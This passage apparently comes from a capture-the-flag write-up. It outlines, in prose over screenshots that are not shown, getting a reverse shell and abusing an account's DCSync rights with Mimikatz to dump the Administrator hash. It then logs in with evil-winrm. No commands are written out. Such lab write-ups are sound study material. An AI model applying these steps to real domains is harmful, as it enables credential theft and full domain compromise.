<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Get the reverse shell:

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

We know from previous analysis with BloodHound that `SSA_6010` have DCSync privilege on Domain Controller:

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation (Administrator)

Download Mimikatz on machine and grab the Administrator hash:

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Run the DCSync attack using mimikatz:

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Login using evil-winrm and finally pwn the machine :tada:

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
